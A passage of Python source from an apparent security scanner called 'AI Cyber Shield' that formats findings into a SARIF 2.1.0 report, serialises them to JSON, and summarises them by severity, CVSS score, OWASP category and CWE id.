            result["properties"]["parameter"] = f.parameter

        results.append(result)

    now = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    return {
        "$schema": _SARIF_SCHEMA,
        "version": "2.1.0",
        "runs": [
            {
                "tool": {
                    "driver": {
                        "name":            "AI Cyber Shield",
                        "version":         _TOOL_VERSION,
                        "semanticVersion": _TOOL_VERSION,
                        "informationUri":  "https://github.com/ai-cyber-shield",
                        "rules":           rule_list,
                    }
                },
                "results": results,
                "invocations": [
                    {
                        "executionSuccessful": True,
                        "endTimeUtc":          now,
                        "toolExecutionNotifications": [],
                    }
                ],
                "properties": {
                    "scan_id":    scan_id or str(uuid.uuid4()),
                    "target_url": target_url,
                    "generated":  now,
                },
            }
        ],
    }


def findings_to_json(findings: list[SecurityFinding]) -> list[dict]:
    """Serialize findings to a plain JSON-serialisable list of dicts."""
    return [f.to_dict() for f in findings]


def findings_summary(findings: list[SecurityFinding]) -> dict:
    """Aggregate severity counts and top-level stats — useful for CISO dashboards."""
    by_sev: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        by_sev[f.severity] = by_sev.get(f.severity, 0) + 1

    confirmed = [f for f in findings if f.confirmed]
    top_cvss  = max((f.cvss.score for f in findings), default=0.0)

    return {
        "total":         len(findings),
        "confirmed":     len(confirmed),
        "by_severity":   by_sev,
        "top_cvss_score": top_cvss,
        "owasp_categories": sorted({f.owasp.label for f in findings}),
        "cwe_ids":           sorted({f.cwe.label   for f in findings}),
    }
